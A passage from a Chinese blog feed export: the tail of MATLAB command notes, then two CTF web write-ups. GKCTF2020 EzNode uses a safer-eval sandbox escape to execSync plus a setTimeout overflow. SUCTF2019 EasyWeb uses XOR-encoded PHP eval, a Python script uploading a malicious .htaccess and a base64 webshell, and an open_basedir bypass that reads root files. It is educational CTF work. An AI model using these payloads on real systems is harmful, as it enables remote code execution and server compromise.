9]</code>，出来的就是<code>3v3</code>的矩阵了<br><pre class="line-numbers language-none"><code class="language-none">m &#x3D;          1.00          2.00          3.00          4.00          5.00          6.00          7.00          8.00          9.00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="2-命令"><a href="#2-命令" class="headerlink" title="2.命令"></a>2.命令</h2><h3 id="1-MATLAB管理会话的命令"><a href="#1-MATLAB管理会话的命令" class="headerlink" title="(1).MATLAB管理会话的命令"></a>(1).MATLAB管理会话的命令</h3><blockquote><p>命令    目的/作用<br>clc    清除命令窗口。<br>clear    从内存中删除变量。<br>exist    检查存在的文件或变量。<br>global    声明变量为全局。<br>help    搜索帮助主题。<br>lookfor    搜索帮助关键字条目。<br>quit    停止MATLAB。<br>who    列出当前变量。<br>whos    列出当前变量（长显示）</p></blockquote><h3 id="2-MATLAB的系统命令"><a href="#2-MATLAB的系统命令" class="headerlink" title="(2).MATLAB的系统命令"></a>(2).MATLAB的系统命令</h3><blockquote><p>命令    目的/作用<br>cd    改变当前目录。<br>date    显示当前日期。<br>delete    删除一个文件。<br>diary    日记文件记录开/关切换。<br>dir    列出当前目录中的所有文件。<br>load    负载工作区从一个文件中的变量。<br>path    显示搜索路径。<br>pwd    显示当前目录。<br>save    保存在一个文件中的工作区变量。<br>type    显示一个文件的​​内容。<br>what    列出所有MATLAB文件在当前目录中。<br>wklread    读取.wk1电子表格文件。 </p></blockquote><h3 id="3-MATLAB输入和输出命令"><a href="#3-MATLAB输入和输出命令" class="headerlink" title="(3).MATLAB输入和输出命令"></a>(3).MATLAB输入和输出命令</h3><blockquote><p>命令    作用/目的<br>disp    显示一个数组或字符串的内容。<br>fscanf    阅读从文件格式的数据。<br>format    控制屏幕显示的格式。<br>fprintf    执行格式化写入到屏幕或文件。<br>input    显示提示并等待输入。<br>;    禁止显示网版印刷</p></blockquote><p><strong>fscanf和fprintf命令的行为像C scanf和printf函数。他们支持格式如下代码：</strong><br><pre class="line-numbers language-none"><code class="language-none">格式代码目的&#x2F;作用%s输出字符串%d输出整数%f输出浮点数%e显示科学计数法形式%g%f 和%e 的结合，根据数据选择适当的显示方式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h4 id="格式控制"><a href="#格式控制" class="headerlink" title=".格式控制"></a><1>.格式控制</1></h4><p><strong>用于数字显示格式的函数有以下几种形式：</strong></p><p>Format函数    最多可显示<br>format short    四位十进制数（默认）<br>format long    15位定点表示<br>format short e    五位浮点表示<br>format long e    15位浮点表示<br>format bank    两个十进制数字<br>format +    正，负或零<br>format rat    有理数近似<br>format compact    变量之间没有空行<br>format loose    变量之间有空行</p><h3 id="4-MATLAB向量，矩阵和阵列命令"><a href="#4-MATLAB向量，矩阵和阵列命令" class="headerlink" title="(4).MATLAB向量，矩阵和阵列命令"></a>(4).MATLAB向量，矩阵和阵列命令</h3><blockquote><p>命令    作用/目的<br>cat    连接数组<br>find    查找非零元素的索引<br>length    计算元素数量<br>linspace    创建间隔向量<br>logspace    创建对数间隔向量<br>max    返回最大元素<br>min    返回最小元素<br>prod    计算数组元素的连乘积<br>reshape    重新调整矩阵的行数、列数、维数<br>size    计算数组大小<br>sort    排序每个列<br>sum    每列相加<br>eye    创建一个单位矩阵<br>ones    生成全1矩阵<br>zeros    生成零矩阵<br>cross    计算矩阵交叉乘积<br>dot    计算矩阵点积<br>det    计算数组的行列式<br>inv    计算矩阵的逆<br>pinv    计算矩阵的伪逆<br>rank    计算矩阵的秩<br>rref    将矩阵化成行最简形<br>cell    创建单元数组<br>celldisp    显示单元数组<br>cellplot    显示单元数组的图形表示<br>num2cell    将数值阵列转化为异质阵列<br>deal    匹配输入和输出列表<br>iscell    判断是否为元胞类型 </p></blockquote><h3 id="5-MATLAB绘图命令"><a href="#5-MATLAB绘图命令" class="headerlink" title="(5).MATLAB绘图命令"></a>(5).MATLAB绘图命令</h3><blockquote><p>axis    人功选择坐标轴尺寸<br>fplot    智能绘图功能<br>grid    显示网格线<br>plot    生成XY图<br>print    打印或绘图到文件<br>title    把文字置于顶部<br>xlabel    将文本标签添加到x轴<br>ylabel    将文本标签添加到y轴<br>axes    创建轴对象<br>close    关闭当前的绘图<br>close all    关闭所有绘图<br>figure    打开一个新的图形窗口<br>gtext    通过鼠标在指定位置放注文<br>hold    保持当前图形<br>legend    鼠标放置图例<br>refresh    重新绘制当前图形窗口<br>set    指定对象的属性，如轴<br>subplot    在子窗口中创建图<br>text    在图上做标记<br>bar    创建条形图<br>loglog    创建双对数图<br>polar    创建极坐标图像<br>semilogx    创建半对数图（对数横坐标）<br>semilogy    创建半对数图（对数纵坐标）<br>stairs    创建阶梯图<br>stem    创建针状图</p></blockquote><h2 id="3-MATLAB的-M-文件"><a href="#3-MATLAB的-M-文件" class="headerlink" title="3.MATLAB的 M 文件"></a>3.MATLAB的 M 文件</h2><p>MATLAB允许写两个程序文件：<br>    <code>脚本 - 脚本文件 .m 扩展程序文件。在这些文件中写的一系列命令，想一起执行。脚本不接受输入和不返回任何输出。他们在工作区中的数据操作。</code><br>    <code>函数 - 函数文件 .m 扩展程序文件。函数可以接受输入和返回输出。内部变量是本地的函数。</code></p><p>可以在matlab的<code>&gt;&gt;</code>命令行里面输入以下命令创建<code>.m</code>脚本文件。<br><pre class="line-numbers language-none"><code class="language-none">mkdir progs    % create directory progs under default directorychdir progs    % changing the current directory to progsedit  prog1.m  % creating an m file named prog1.m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><img src="/2020/10/27/MATLAB%E5%AE%89%E8%A3%85%E7%BB%8F%E9%AA%8C/1.png" alt></p><p>可写入脚本文件，内容为<br><pre class="line-numbers language-none"><code class="language-none">a &#x3D; 5;b &#x3D; 7;c &#x3D; a + b;d &#x3D; c + sin(b);e &#x3D; 5 * d;f &#x3D; exp(-d);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>在上面运行，可以看到右侧工作区的键值对改变了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 经验 </tag>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF2020-EZ三剑客-EzNode</title>
      <link href="2020/10/27/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzNode/"/>
      <url>2020/10/27/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzNode/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>SB, I FUCKING LOVE YOU</p></blockquote><h2 id="1-提示"><a href="#1-提示" class="headerlink" title="1.提示"></a>1.提示</h2><p>一共有两个提示，下面分别列出来</p><h3 id="1-版本"><a href="#1-版本" class="headerlink" title="1.版本"></a>1.版本</h3><p>这是第一个提示<br><pre class="line-numbers language-none"><code class="language-none">&#123;  &quot;name&quot;: &quot;src&quot;,  &quot;version&quot;: &quot;1.0.0&quot;,  &quot;main&quot;: &quot;index.js&quot;,  &quot;license&quot;: &quot;MIT&quot;,  &quot;dependencies&quot;: &#123;    &quot;body-parser&quot;: &quot;1.19.0&quot;,    &quot;express&quot;: &quot;4.17.1&quot;,    &quot;safer-eval&quot;: &quot;1.3.6&quot;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><code>&quot;safer-eval&quot;: &quot;1.3.6&quot;</code>这个版本有漏洞，<a href="https://github.com/commenthol/safer-eval/issues/10">沙箱逃逸</a><br>这里的payload可以为以下代码<br><pre class="line-numbers language-none"><code class="language-none">Function &#x3D; (function () &#123;  const process &#x3D; clearImmediate.constructor(&quot;return process;&quot;)();  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;)()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="2-源代码"><a href="#2-源代码" class="headerlink" title="2.源代码"></a>2.源代码</h3><p>这是第二个提示<br><pre class="line-numbers language-none"><code class="language-none">const express &#x3D; require(&#39;express&#39;);const bodyParser &#x3D; require(&#39;body-parser&#39;);const saferEval &#x3D; require(&#39;safer-eval&#39;); &#x2F;&#x2F; 2019.7&#x2F;WORKER1 找到一个很棒的库const fs &#x3D; require(&#39;fs&#39;);const app &#x3D; express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());&#x2F;&#x2F; 2020.1&#x2F;WORKER2 老板说为了后期方便优化app.use((req, res, next) &#x3D;&gt; &#123;  if (req.path &#x3D;&#x3D;&#x3D; &#39;&#x2F;eval&#39;) &#123;    let delay &#x3D; 60 * 1000;    console.log(delay);    if (Number.isInteger(parseInt(req.query.delay))) &#123;      delay &#x3D; Math.max(delay, parseInt(req.query.delay));    &#125;    const t &#x3D; setTimeout(() &#x3D;&gt; next(), delay);    &#x2F;&#x2F; 2020.1&#x2F;WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事    setTimeout(() &#x3D;&gt; &#123;      clearTimeout(t);      console.log(&#39;timeout&#39;);      try &#123;        res.send(&#39;Timeout!&#39;);      &#125; catch (e) &#123;      &#125;    &#125;, 1000);  &#125; else &#123;    next();  &#125;&#125;);app.post(&#39;&#x2F;eval&#39;, function (req, res) &#123;  let response &#x3D; &#39;&#39;;  if (req.body.e) &#123;    try &#123;      response &#x3D; saferEval(req.body.e);                                     &#x2F;&#x2F;在这里沙箱逃逸，故需要以POST方式提交e    &#125; catch (e) &#123;      response &#x3D; &#39;Wrong Wrong Wrong!!!!&#39;;    &#125;  &#125;  res.send(String(response));&#125;);&#x2F;&#x2F; 2019.10&#x2F;WORKER1 老板娘说她要看到我们的源代码，用行数计算KPIapp.get(&#39;&#x2F;source&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text&#x2F;javascript;charset&#x3D;utf-8&#39;);  res.send(fs.readFileSync(&#39;.&#x2F;index.js&#39;));&#125;);&#x2F;&#x2F; 2019.12&#x2F;WORKER3 为了方便我自己查看版本，加上这个接口app.get(&#39;&#x2F;version&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text&#x2F;json;charset&#x3D;utf-8&#39;);  res.send(fs.readFileSync(&#39;.&#x2F;package.json&#39;));&#125;);app.get(&#39;&#x2F;&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text&#x2F;html;charset&#x3D;utf-8&#39;);  res.send(fs.readFileSync(&#39;.&#x2F;index.html&#39;))&#125;)app.listen(80, &#39;0.0.0.0&#39;, () &#x3D;&gt; &#123;  console.log(&#39;Start listening&#39;)&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>上面是js代码，状况感觉就发生在<img src="/2020/10/27/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzNode/1.png" alt>这里。</p><h2 id="2-setTimeout-函数int溢出"><a href="#2-setTimeout-函数int溢出" class="headerlink" title="2.setTimeout()函数int溢出"></a>2.setTimeout()函数int溢出</h2><p>想进行我们邪恶的<code>/eval</code>，还得绕过一个超时判定，即下面的代码<br><pre class="line-numbers language-none"><code class="language-none">if (req.path &#x3D;&#x3D;&#x3D; &#39;&#x2F;eval&#39;) &#123;    ... &#x2F;&#x2F;此处省略&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><p>这里对于<code>query</code>(GET)到的参数<code>delay</code>与原先的delay做了一个取最大值的操作，原先的<code>delay=60 * 1000</code>。</p><pre class="line-numbers language-none"><code class="language-none">if (Number.isInteger(parseInt(req.query.delay))) &#123;      delay &#x3D; Math.max(delay, parseInt(req.query.delay));    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是这里的下面的一个函数存在漏洞，故而可以绕过这个<code>Timeout</code>继续向下执行<br><pre class="line-numbers language-none"><code class="language-none">const t &#x3D; setTimeout(() &#x3D;&gt; next(), delay);    &#x2F;&#x2F; 2020.1&#x2F;WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事    setTimeout(() &#x3D;&gt; &#123;      clearTimeout(t);      console.log(&#39;timeout&#39;);      try &#123;        res.send(&#39;Timeout!&#39;);      &#125; catch (e) &#123;      &#125;    &#125;, 1000);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>限制时间不超过1000，单位应该是<code>1000ms</code>吧!所以用下面的知识绕过</p><blockquote><p>就是我们传入的delay如果二进制大小超过32位（2147483647即<code>2^31-1</code>，&lt;因为有符号位&gt;），会被settimeout设为1，这样就满足条件了</p></blockquote><h2 id="3-payload"><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h2><p>所以我们可以得出以下的payload</p><pre class="line-numbers language-none"><code class="language-none">#GET&#x2F;eval?delay&#x3D;2147483648#POSTe&#x3D;(function () &#123;  const process &#x3D; clearImmediate.constructor(&quot;return process;&quot;)();  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;)()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/10/27/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzNode/2.png" alt></p><h2 id="4-flag"><a href="#4-flag" class="headerlink" title="4.flag"></a>4.flag</h2><p>将POST内容改为<br><pre class="line-numbers language-none"><code class="language-none">e&#x3D;(function () &#123;  const process &#x3D; clearImmediate.constructor(&quot;return process;&quot;)();  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat &#x2F;flag&quot;).toString()&#125;)()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>即可获得flag</p><p><img src="/2020/10/27/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzNode/3.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;16bb2fd5-c976-4cbb-ad1f-5cb598c1c3ec&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2019-EasyWeb</title>
      <link href="2020/10/26/SUCTF2019-EasyWeb/"/>
      <url>2020/10/26/SUCTF2019-EasyWeb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-源码"><a href="#1-源码" class="headerlink" title="1.源码"></a>1.源码</h2><pre class="line-numbers language-none"><code class="language-none"> &lt;?phpfunction get_the_flag()&#123;    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!!     $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh &#x3D; @$_GET[&#39;_&#39;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#39;One inch long, one inch strong!&#39;);&#125;if ( preg_match(&#39;&#x2F;[\x00- 0-9A-Za-z\&#39;&quot;\&#96;~_&amp;.,|&#x3D;[\x7F]+&#x2F;i&#39;, $hhh) )    die(&#39;Try something else!&#39;);$character_type &#x3D; count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先看下面的代码执行RCE。<code>eval($hhh);</code>。</p><h2 id="2-php不可见字符绕过preg-match-函数rce"><a href="#2-php不可见字符绕过preg-match-函数rce" class="headerlink" title="2.php不可见字符绕过preg_match()函数rce"></a>2.php不可见字符绕过preg_match()函数rce</h2><p>首先有<code>eval()</code>函数，就先想着绕过前面的各种限制（就是字符串的长度小于或等于18个），这个看大佬的wp说可以用什么不可见字符异或得我们想要的字符来绕过，下面是大佬的脚本<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parsefind <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'G'</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">,</span><span class="token string">'T'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">^</span>j<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>result <span class="token keyword">in</span> find<span class="token punctuation">)</span><span class="token punctuation">:</span>            a <span class="token operator">=</span> i<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span>            b <span class="token operator">=</span> j<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span>            a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>a<span class="token punctuation">)</span>            b <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>b<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s:%s^%s"</span><span class="token operator">%</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><img src="/2020/10/26/SUCTF2019-EasyWeb/1.png" alt></p><p>可见<br><pre class="line-numbers language-res" data-language="res"><code class="language-res">_:%FF^%A0G:%FF^%B8E:%FF^%BAT:%FF^%AB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p><p>可用的payload:<br><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?_&#x3D;$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo她所代表的真正的含义为&#96;$_GET&#123;x&#125;()&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>后面就能通过上传参数<code>x=phpinfo</code>构造<code>phpinfo();</code>了。（ztmnb）<br><img src="/2020/10/26/SUCTF2019-EasyWeb/2.png" alt></p><p>然后把<code>phpinfo</code>换为<code>get_the_flag()</code>函数就能执行这个上传的功能了。（好像是因为设置了什么open_basedir限制了eval的功能，所以得传个webshell才可）</p><h2 id="3-上传webshell"><a href="#3-上传webshell" class="headerlink" title="3.上传webshell"></a>3.上传webshell</h2><p>上传部分源码为<br><pre class="line-numbers language-none"><code class="language-none">function get_the_flag()&#123;    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!!     $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;);   #对ph开头的后缀名做了限制        if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;);  #对&#96;&lt;?&#96;做了限制    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="1-上传文件"><a href="#1-上传文件" class="headerlink" title="1.上传文件"></a>1.上传文件</h3><p>大佬的经验<code>.htaccess上传的时候不能用GIF89a等文件头去绕过exif_imagetype,因为这样虽然能上传成功，但.htaccess文件无法生效。</code><br>可以用以下两种方法开头以绕过<br><pre class="line-numbers language-none"><code class="language-none">可以用&quot;\x00\x00\x8a\x39\x8a\x39&quot;也可以用&quot;#define width 1337&quot;&quot;#define height 1337&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>另外<code>因为这里的php是7.2的版本，无法使用 &lt;script language=&quot;php&quot;&gt;&lt;/script&gt; 来绕过对 &lt;? 的检测</code></p><p>这里的绕过对<code>&lt;?</code>的检测。可以使用<code>base64编码</code>进行绕过，然后再在apache的解析文件中将文件的内容还原从而绕过<br><img src="/2020/10/26/SUCTF2019-EasyWeb/3.png" alt></p><p>.htaccess文件<br><pre class="line-numbers language-none"><code class="language-none">\x00\x00\x8a\x39\x8a\x39AddType application&#x2F;x-httpd-php .abcphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_556cf09f27d80bd5b6cffc1d3f08a264&#x2F;sh3ll.abc&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>这里的<code>tmp_</code>后面的似乎是当前的ip地址md5加密后的结果，~浏览器输入ip，复制后加密取32位小写代换一下就ok啦。~好了这样不行，我好jb菜，得等下面的脚本运行成功后改为脚本打印出来的值就ok了。</p><p>sh3ll.abc文件<br><pre class="line-numbers language-none"><code class="language-none">GIF89a12PD9waHAgZXZhbCgkX0dFVFsnMSddKTs&#x2F;Pg&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><h3 id="2-上传文件的脚本"><a href="#2-上传文件的脚本" class="headerlink" title="2.上传文件的脚本"></a>2.上传文件的脚本</h3><p>借鉴一个上传文件的脚本如下:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64htaccess <span class="token operator">=</span> <span class="token triple-quoted-string string">b"""#define width 1337#define height 1337 AddType application/x-httpd-php .abcphp_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_556cf09f27d80bd5b6cffc1d3f08a264/sh3ll.abc""""</span>sh3ll <span class="token operator">=</span> <span class="token string">b"GIF89a12"</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">b"&lt;?php eval($_REQUEST['1']);?>"</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://142537bb-b873-4a5a-900c-80c61dd2b53d.node3.buuoj.cn/?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag"</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span>htaccess<span class="token punctuation">,</span><span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"upload"</span><span class="token punctuation">:</span><span class="token string">"Submit"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'sh3ll.abc'</span><span class="token punctuation">,</span>sh3ll<span class="token punctuation">,</span><span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>          <span class="token comment">#文件:('上传的文件名',变量名,'文件类型')</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件上传成功<img src="/2020/10/26/SUCTF2019-EasyWeb/4.png" alt></p><h2 id="4-绕过disable-function之open-basedir"><a href="#4-绕过disable-function之open-basedir" class="headerlink" title="4.绕过disable_function之open_basedir:"></a>4.绕过disable_function之<code>open_basedir:</code></h2><p><a href="https://xz.aliyun.com/t/4720">先知上绕过open_basedir限制的解析</a><br>所以这个可以用下面的payload（文章内容没细看）<br>在<code>hackbar</code>里面测试<br><pre class="line-numbers language-none"><code class="language-none">1&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p><img src="/2020/10/26/SUCTF2019-EasyWeb/5.png" alt><br>flag文件名为<code>THis_Is_tHe_F14g</code></p><pre class="line-numbers language-none"><code class="language-none">1&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;&#x2F;THis_Is_tHe_F14g&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/10/26/SUCTF2019-EasyWeb/6.png" alt></p><h2 id="5-flag"><a href="#5-flag" class="headerlink" title="5.flag"></a>5.flag</h2><p><code>flag&#123;3f0c058d-ac5a-45a8-a1fd-8ab96b968630&#125;</code></p><blockquote><p>好TM累，睡觉！</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> php代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ_密码_RSA</title>
